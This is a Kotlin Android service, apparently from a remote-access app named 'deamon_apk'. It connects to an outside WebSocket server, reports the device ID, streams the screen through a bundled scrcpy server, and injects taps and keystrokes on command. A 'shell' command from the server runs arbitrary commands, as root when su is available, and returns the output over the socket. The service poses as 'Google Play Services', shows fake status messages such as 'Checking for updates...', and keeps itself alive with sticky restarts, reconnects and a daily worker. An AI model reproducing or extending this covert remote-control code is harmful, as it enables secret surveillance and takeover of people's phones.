package com.sam.deamon_apk

import android.app.Notification
import androidx.core.app.NotificationCompat
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import java.util.concurrent.TimeUnit
import org.json.JSONObject

class WebSocketService : Service() {
    private val endpoint = "wss://deamon-backend-production.up.railway.app/ws"
    private val client = OkHttpClient.Builder().readTimeout(0, TimeUnit.MILLISECONDS).build()
    private var ws: WebSocket? = null
    private var bridge: ScrcpyBridge? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var reconnectJob: Job? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        copyAssets()
        scheduleWork(this)
        createNotificationChannel()
        startForeground(1, notification("Checking for updates..."))
        ensureBridge()
        bridge?.startListeners()
        connect()
    }

    private fun copyAssets() {
        try {
            val filename = "scrcpy-server-v3.3.3"
            val file = java.io.File(filesDir, filename)
            if (!file.exists()) {
                assets.open(filename).use { inputStream ->
                    java.io.FileOutputStream(file).use { outputStream ->
                        inputStream.copyTo(outputStream)
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> scope.launch { ensureBridge(); bridge?.start(3500000, 720, 60) }
            ACTION_STOP -> scope.launch { bridge?.stop() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        ws?.close(1000, null)
        ws = null
        scope.launch {
            bridge?.stop()
        }
    }

    private fun connect() {
        val request = Request.Builder().url(endpoint).build()
        ws = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: okhttp3.Response) {
                StatusRepository.setWebSocketStatus("connected")
                val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
                val hello = "{\"type\":\"device\",\"id\":\"$id\"}"
                webSocket.send(hello)
                StatusRepository.setDeviceId(id)
                ensureBridge()
                bridge?.startListeners()
                updateNotification("Connected")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val obj = JSONObject(text)
                    when (obj.optString("cmd")) {
                        "start" -> {
                            val bitrateVal = if (obj.has("bitrate")) obj.optInt("bitrate") else null
                            val maxSizeVal = if (obj.has("maxSize")) obj.optInt("maxSize") else null
                            val maxFpsVal = if (obj.has("maxFps")) obj.optInt("maxFps") else null
                            scope.launch { bridge?.start(bitrateVal, maxSizeVal, maxFpsVal) }
                        }
                        "stop" -> scope.launch { bridge?.stop() }
                        else -> {
                            when (obj.optString("type")) {
                                "touch" -> {
                                    val x = obj.optDouble("x", Double.NaN)
                                    val y = obj.optDouble("y", Double.NaN)
                                    if (!x.isNaN() && !y.isNaN()) scope.launch { runShell("input tap ${(x*1080).toInt()} ${(y*1920).toInt()}") }
                                }
                                "key" -> {
                                    val key = obj.optString("key", "")
                                    val map = mapOf("Enter" to 66, "Backspace" to 67, "Escape" to 111)
                                    val code = map[key] ?: 66
                                    scope.launch { runShell("input keyevent $code") }
                                }
                                "shell" -> {
                                    val cmd = obj.optString("command", "")
                                    if (cmd.isNotEmpty()) scope.launch { runShell(cmd) }
                                }
                            }
                        }
                    }
                } catch (_: Exception) {}
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                bridge?.sendControl(bytes.toByteArray())
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                StatusRepository.setWebSocketStatus("disconnected")
                StatusRepository.incReconnect()
                scheduleReconnect()
                updateNotification("Waiting for network...")
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: okhttp3.Response?) {
                StatusRepository.setWebSocketStatus("error")
                StatusRepository.setLastError(t.message ?: "")
                StatusRepository.incReconnect()
                scheduleReconnect()
                updateNotification("Sync paused")
            }
        })
    }

    private var shellProcess: Process? = null
    private var shellInput: java.io.OutputStream? = null

    private fun ensureShellProcess() {
        if (shellProcess != null && (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) shellProcess!!.isAlive else true)) return
        try {
            try {
                shellProcess = ProcessBuilder("su").redirectErrorStream(true).start()
            } catch (e: Exception) {
                shellProcess = ProcessBuilder("sh").redirectErrorStream(true).start()
            }
            shellInput = shellProcess!!.outputStream
            
            scope.launch(Dispatchers.IO) {
                try {
                    val ins = shellProcess!!.inputStream
                    val buf = ByteArray(4096)
                    while (true) {
                        val n = ins.read(buf)
                        if (n <= 0) break
                        val s = String(buf, 0, n)
                        val msg = JSONObject()
                        msg.put("type", "status")
                        msg.put("source", "apk")
                        msg.put("level", "info")
                        msg.put("msg", s)
                        try { ws?.send(msg.toString()) } catch (_: Exception) {}
                    }
                } catch (_: Exception) {}
                shellProcess = null
                shellInput = null
            }
        } catch (e: Exception) {
            shellProcess = null
        }
    }

    private fun runShell(cmd: String) {
        ensureShellProcess()
        try {
            shellInput?.write((cmd + "\n").toByteArray())
            shellInput?.flush()
        } catch (e: Exception) {
            shellProcess = null
            shellInput = null
        }
    }

    private fun ensureBridge() {
        if (bridge == null) {
            bridge = ScrcpyBridge(
                { bytes -> 
                    try { ws?.send(bytes) } catch (_: Exception) {}
                }, 
                { text -> 
                    try { ws?.send(text) } catch (_: Exception) {}
                }
            )
        }
    }

    private fun scheduleReconnect() {
        if (reconnectJob?.isActive == true) return
        reconnectJob = scope.launch {
            try { Thread.sleep(3000) } catch (_: Exception) {}
            connect()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("gms_core", "Google Play Services", NotificationManager.IMPORTANCE_LOW)
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun notification(text: String): Notification {
        val builder = NotificationCompat.Builder(this, "gms_core")
        return builder.setContentTitle("Google Play Services")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()
    }

    private fun updateNotification(text: String) {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.notify(1, notification(text))
    }

    companion object {
        const val ACTION_START = "com.sam.deamon_apk.START"
        const val ACTION_STOP = "com.sam.deamon_apk.STOP"
        fun start(context: Context) {
            context.startForegroundService(Intent(context, WebSocketService::class.java))
        }
        fun startScrcpy(context: Context) {
            val i = Intent(context, WebSocketService::class.java).apply { action = ACTION_START }
            context.startForegroundService(i)
        }
        fun stopScrcpy(context: Context) {
            val i = Intent(context, WebSocketService::class.java).apply { action = ACTION_STOP }
            context.startService(i)
        }

        fun scheduleWork(context: Context) {
            val request = PeriodicWorkRequestBuilder<KeepAliveWorker>(24, TimeUnit.HOURS)
                .setConstraints(Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build())
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "KeepAlive",
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )
        }
    }
}
